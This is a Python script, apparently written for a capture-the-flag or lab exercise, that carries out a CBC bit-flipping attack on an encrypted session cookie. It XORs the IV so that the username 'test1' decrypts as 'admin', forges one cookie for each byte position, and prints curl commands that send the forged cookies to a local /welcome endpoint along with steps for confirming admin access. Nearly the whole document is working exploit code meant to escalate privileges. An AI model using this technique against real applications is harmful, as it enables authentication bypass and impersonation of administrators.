# CBC Bit-Flipping Attack Calculation

original_cookie = "34cfddef70254826b31cf5b83d6fb384050debdc6ca0ed5cbe19022f8c629c77"
old_str = "test1"
new_str = "admin"

print("="*70)
print("CBC BIT-FLIPPING ATTACK - MANUAL CALCULATION")
print("="*70)
print(f"Input:")
print(f"  Original cookie: {original_cookie}")
print(f"  Change '{old_str}' to '{new_str}'")
print()

# Parse cookie
cookie_bytes = bytes.fromhex(original_cookie)
original_iv = cookie_bytes[:16]
ciphertext = cookie_bytes[16:]

print(f"Cookie structure:")
print(f"  IV (16 bytes):  {original_iv.hex()}")
print(f"  IV (decimal):   {list(original_iv)}")
print(f"  Ciphertext:     {ciphertext.hex()}")
print()

# Calculate modified cookies for each position
print("="*70)
print("CALCULATING BIT FLIPS FOR EACH POSITION")
print("="*70)
print()

modified_cookies = {}

for pos in range(16 - len(old_str) + 1):  # Positions 0-11
    print(f"Position {pos}:")
    print("-" * 40)
    
    modified_iv = bytearray(original_iv)
    print(f"  Original IV: {list(original_iv)}")
    
    # Apply XOR for each character
    for i, (old_char, new_char) in enumerate(zip(old_str, new_str)):
        idx = pos + i
        old_byte = original_iv[idx]
        xor_mask = ord(old_char) ^ ord(new_char)
        new_byte = old_byte ^ xor_mask
        modified_iv[idx] = new_byte
        
        print(f"    Byte {idx}: {old_byte:3d} (0x{old_byte:02x}) XOR {xor_mask:3d} (0x{xor_mask:02x}) = {new_byte:3d} (0x{new_byte:02x})")
        print(f"             '{old_char}' ^ '{new_char}' = mask 0x{xor_mask:02x}")
    
    print(f"  Modified IV: {list(modified_iv)}")
    
    # Create new cookie
    new_cookie = modified_iv + ciphertext
    new_cookie_hex = new_cookie.hex()
    modified_cookies[pos] = new_cookie_hex
    
    print(f"  New cookie:  {new_cookie_hex}")
    print()

# Display all modified cookies
print("="*70)
print("ALL MODIFIED COOKIES TO TEST")
print("="*70)
print()

for pos, cookie in modified_cookies.items():
    print(f"Position {pos:2d}: {cookie}")

# Create curl commands
print()
print("="*70)
print("CURL TEST COMMANDS")
print("="*70)
print()

for pos in range(10):  # Show first 10 positions
    cookie = modified_cookies[pos]
    print(f"# Position {pos}:")
    print(f"curl -s http://127.0.0.1:32835/welcome -H 'Cookie: session={cookie}' | grep -i admin")
    print()

# Summary
print("="*70)
print("ATTACK SUMMARY")
print("="*70)
print(f"Total positions to test: {len(modified_cookies)}")
print(f"Cookie structure: IV[16] + Ciphertext[16] = 32 bytes = 64 hex chars")
print(f"Formula: new_IV_byte = original_IV_byte XOR old_char XOR new_char")
print()
print("Testing instructions:")
print("1. Test each modified cookie on /welcome endpoint")
print("2. Look for 'admin' in the response")
print("3. Success confirmed when username changes from 'test1' to 'admin'")
print()
print("If no success:")
print("- Try extended range (0-11 instead of 0-10)")
print("- Username may be in different format")
print("- Try other endpoints that display username")
